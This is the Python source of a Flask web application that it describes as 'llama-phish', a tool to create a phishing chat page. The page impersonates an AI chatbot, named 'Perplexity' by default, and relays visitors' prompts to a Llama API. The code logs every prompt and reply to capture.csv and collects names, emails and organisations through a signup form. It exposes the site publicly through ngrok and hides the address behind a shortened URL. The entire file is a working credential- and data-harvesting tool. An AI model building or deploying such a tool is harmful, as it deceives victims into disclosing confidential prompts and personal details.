import json
import os
import argparse
import csv
import pyshorteners
import datetime
from flask import Flask, request, render_template, redirect, url_for
from llamaapi import LlamaAPI
from colorama import Fore
from tabulate import tabulate
from pyngrok import ngrok

app = Flask(__name__)

# Argument parser setup
parser = argparse.ArgumentParser(description='llama-phish - A tool to create phishing chat-based llm page')
parser.add_argument('--llama-token', required=True, help='Obtain llama API token from https://console.llama-api.com/account/api-token')
parser.add_argument('--name', required=False, help='Custom name for your GPT')
args = parser.parse_args()

# Initialize LlamaAPI with the provided token
llama = LlamaAPI(args.llama_token)
name = 'Perplexity' if args.name is None else args.name

# Prompts
completion_prompt = "check if the following prompt is completed if not give user the remaining part without including this 'prompt is incomplete. Here is the remaining part: ' or 'your prompt is complete!' and avoid using this as well 'It seems like the prompt is incomplete. Here is the remaining part:' if it is completed then ask user to be more specific - the prompt to check: - "

def format_output(text):
    """
    Formats the output by adding bold tags to text enclosed in **.
    """
    formatted_text_1 = ''.join([f"<span style='font-weight:bold'>{segment}</span>" if idx % 2 == 1 else segment.replace('*', '-') for idx, segment in enumerate(text.split('**'))])
    formatted_text_2 = ''.join([f"<div style='font-family: monospace; border: #777777 2px solid;border-radius:5px; background-color:#2a2a2a;'><p style='padding:5px'>{segment}</p></div>" if idx % 2 == 1 else segment for idx, segment in enumerate(formatted_text_1.split('```'))])
    formatted_text_3 = ''.join([f"<span style='font-family: monospace; border: #777777 2px solid;border-radius:3px; background-color:#2a2a2a;padding:3px'>{segment}</span>" if idx % 2 == 1 else segment for idx, segment in enumerate(formatted_text_2.split('`'))])
    #print(formatted_text_3)
    return formatted_text_3

def get_prompt_response(prompt):
    """
    Sends a prompt to the LlamaAPI and returns the response.
    """
    try:
        api_request_json = {
            'model': 'llama-70b-chat',
            'messages': [{'role': 'user', 'content': prompt}],
            "max_token": 500,
            "temperature": 0.1,
            "top_p": 1.0,
            "frequency_penalty": 1.0
        }

        # Execute the request
        response = llama.run(api_request_json)
        response.raise_for_status()

        # Extract the response content
        output = response.json()['choices'][0]['message']['content']
        formatted_output = format_output('<br>'.join(output.split('\n')))
        return formatted_output
    except Exception as e:
        print(f"Error in get_prompt_response: {e}")
        return 'How can I assist you today?'

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        try:
            user_input = request.json.get('user_input')
            if not user_input:
                raise ValueError("No user input provided")
            
            output = get_prompt_response(user_input)
            extended_output = get_prompt_response(completion_prompt + output)

            print('\n'+'='*150+'\n'+Fore.GREEN + f'[{datetime.datetime.now().strftime("%d/%m/%Y, %H:%M:%S")}] User Prompt - {user_input}' + Fore.RESET+'\n'+'='*150+'\n')

            # Log the interaction to a CSV file
            log_entry = [datetime.datetime.now().strftime("%d/%m/%Y, %H:%M:%S"), user_input, output + extended_output]
            file_exists = os.path.exists('capture.csv')
            with open('capture.csv', 'a' if file_exists else 'w', newline='') as file:
                writer = csv.writer(file)
                writer.writerow(log_entry)
            
            return json.dumps({'output': output + extended_output})
        except Exception as e:
            print(f"Error in home POST: {e}")
            return json.dumps({'output': 'How can I assist you today?'})
    elif request.method == 'GET':
        return render_template('index.html', name=name)

@app.route('/signup', methods=['GET', 'POST'])
def signup():
    if request.method == 'POST':
        try:
            user_data = {
                'name': request.form['name'],
                'email': request.form['email'],
                'org': request.form['org']
            }
            print(Fore.GREEN + tabulate(user_data.items()) + Fore.RESET)
            return redirect(url_for('home'))
        except Exception as e:
            print(f"Error in signup POST: {e}")
            return render_template('signup.html', name=name, error="Signup failed, please try again.")
    else:
        return render_template('signup.html', name=name)

def app_run():
    app.run(port=443, ssl_context='adhoc')

if __name__ == '__main__':
    banner = Fore.RED + '''
    .........................................................................................
    .##......##.......####...##...##...####...........#####...##..##..######...####...##..##.
    .##......##......##..##..###.###..##..##..........##..##..##..##....##....##......##..##.
    .##......##......######..##.#.##..######..######..#####...######....##.....####...######.
    .##......##......##..##..##...##..##..##..........##......##..##....##........##..##..##.
    .######..######..##..##..##...##..##..##..........##......##..##..######...####...##..##.
    .........................................................................................
    ''' + Fore.RESET
    print(banner)
    try:
        url = ngrok.connect(443, bind_tls=True).public_url
        short_url = pyshorteners.Shortener().tinyurl.short(url)
        print(Fore.GREEN + " [ * ] Public URL: " + short_url + Fore.RESET)
        app_run()
    except Exception as e:
        print(f"Error in main: {e}")
